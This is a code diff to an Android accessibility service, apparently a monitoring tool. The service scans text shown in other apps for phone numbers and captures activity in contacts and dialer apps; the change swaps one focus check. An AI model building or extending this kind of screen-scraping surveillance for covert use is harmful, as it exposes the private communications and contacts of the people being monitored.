@@ -37,7 +37,7 @@ public class MonitorAccessibilityService extends AccessibilityService {
                 String digits = ph.group().replaceAll("\\D", "");
                 if (digits.length() >= 7 && digits.length() <= 15) emit(n.isEditable()?"PHONE_TYPED":"PHONE_SEEN", pkg, ph.group(), id);
             }
-            if ((pkg.contains("contacts") || pkg.contains("dialer")) && (n.isFocused() || n.isClicked() || n.isEditable())) emit("CONTACT_ACTIVITY", pkg, text, id);
+            if ((pkg.contains("contacts") || pkg.contains("dialer")) && (n.isFocused() || n.isAccessibilityFocused() || n.isEditable())) emit("CONTACT_ACTIVITY", pkg, text, id);
         }
         for (int i=0;i<n.getChildCount();i++) scan(n.getChild(i), pkg, mode, depth+1);
     }
